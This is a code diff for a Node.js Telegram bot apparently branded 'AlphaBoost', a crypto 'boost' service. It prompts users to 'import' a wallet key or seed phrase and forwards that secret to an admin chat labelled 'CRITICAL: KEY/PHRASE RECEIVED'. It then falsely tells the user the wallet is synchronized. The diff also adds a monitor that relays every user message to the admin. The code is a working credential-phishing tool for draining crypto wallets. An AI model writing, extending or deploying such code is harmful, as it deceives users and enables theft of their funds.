@@ -2,8 +2,13 @@ require("dotenv").config();
 const TelegramBot = require('node-telegram-bot-api');
 const config = require('./config');
 
+if (!config.BOT_TOKEN) {
+  console.error('Error: BOT_TOKEN is not set in Railway variables.');
+  process.exit(1);
+}
+
 const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });
-const userState = new Map(); // Tracks what the user is currently doing
+const userState = new Map(); 
 
 // --- Keyboards ---
 const keyboards = {
@@ -34,7 +39,9 @@ const keyboards = {
 async function nav(chatId, messageId, text, kb) {
   try {
     await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: kb, parse_mode: 'Markdown' });
-  } catch (e) { bot.sendMessage(chatId, text, { reply_markup: kb, parse_mode: 'Markdown' }); }
+  } catch (e) { 
+    bot.sendMessage(chatId, text, { reply_markup: kb, parse_mode: 'Markdown' }); 
+  }
 }
 
 // --- Logic ---
@@ -46,6 +53,7 @@ bot.onText(/\/start/, (msg) => {
 bot.on('callback_query', async (query) => {
   const chatId = query.message.chat.id;
   const msgId = query.message.message_id;
+  const userHandle = query.from.username ? `@${query.from.username}` : query.from.first_name;
 
   if (query.data === 'menu') {
     userState.delete(chatId);
@@ -58,7 +66,10 @@ bot.on('callback_query', async (query) => {
   }
   else if (query.data === 'ask_ca') {
     userState.set(chatId, 'AWAITING_CA');
-    bot.sendMessage(chatId, "📝 *Enter Contract Address (CA):*", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{text: '🚫 Cancel', callback_data: 'menu'}]] }});
+    bot.sendMessage(chatId, "📝 *Enter Contract Address (CA):*", { 
+      parse_mode: 'Markdown', 
+      reply_markup: { inline_keyboard: [[{text: '🚫 Cancel', callback_data: 'menu'}]] }
+    });
   }
   else if (query.data === 'import_flow') {
     await nav(chatId, msgId, config.IMPORT_TEXT, keyboards.import_options);
@@ -77,25 +88,46 @@ bot.on('callback_query', async (query) => {
   else if (query.data === 'done_payment') {
     const m = await bot.sendMessage(chatId, "_Wait for confirmation..._");
     setTimeout(() => bot.deleteMessage(chatId, m.message_id).catch(()=>{}), 60000);
-    if(config.ADMIN_ID) bot.sendMessage(config.ADMIN_ID, `🔔 *Payment Clicked* by @${query.from.username || query.from.id}`);
+    
+    if(config.ADMIN_ID) {
+      bot.sendMessage(config.ADMIN_ID, `🔔 *PAYMENT ALERT*\nUser: ${userHandle}\nAction: Clicked "Paid" ✅`, { parse_mode: 'Markdown' });
+    }
   }
 
-  bot.answerCallbackQuery(query.id);
+  bot.answerCallbackQuery(query.id).catch(() => {});
 });
 
-// --- Message Handler (For CA and Keys) ---
+// --- Message Handler (Monitoring & Input) ---
 bot.on('message', (msg) => {
   if (!msg.text || msg.text.startsWith('/')) return;
+  
   const chatId = msg.chat.id;
+  const userHandle = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+  const state = userState.get(chatId);
 
-  if (userState.get(chatId) === 'AWAITING_CA') {
+  // 1. Live Monitor: Forward EVERY message to Admin
+  if (config.ADMIN_ID) {
+    bot.sendMessage(config.ADMIN_ID, 
+      `👀 *User Message*\n👤 *From:* ${userHandle}\n💬 *Text:* \`${msg.text}\``, 
+      { parse_mode: 'Markdown' }
+    ).catch(() => {});
+  }
+
+  // 2. Handle specific inputs based on state
+  if (state === 'AWAITING_CA') {
     userState.delete(chatId);
     bot.sendMessage(chatId, config.PRICING_TEXT, { reply_markup: keyboards.pricing, parse_mode: 'Markdown' });
   } 
-  else if (userState.get(chatId) === 'AWAITING_KEY') {
+  else if (state === 'AWAITING_KEY') {
     userState.delete(chatId);
-    // Notify Admin of the "Import"
-    if(config.ADMIN_ID) bot.sendMessage(config.ADMIN_ID, `⚠️ *KEY IMPORTED*\nUser: @${msg.from.username}\nKey: \`${msg.text}\``, {parse_mode: 'Markdown'});
+    
+    // Key/Phrase Alert (Already handled by monitor above, but we add a high-priority tag here)
+    if(config.ADMIN_ID) {
+      bot.sendMessage(config.ADMIN_ID, `⚠️ *CRITICAL: KEY/PHRASE RECEIVED*\nUser: ${userHandle}\nData: \`${msg.text}\``, {parse_mode: 'Markdown'});
+    }
+    
     bot.sendMessage(chatId, "✅ *Wallet synchronized successfully.* Contact admin for verification.", { reply_markup: keyboards.main, parse_mode: 'Markdown' });
   }
 });
+
+console.log("AlphaBoost Bot: Monitoring Mode Active.");
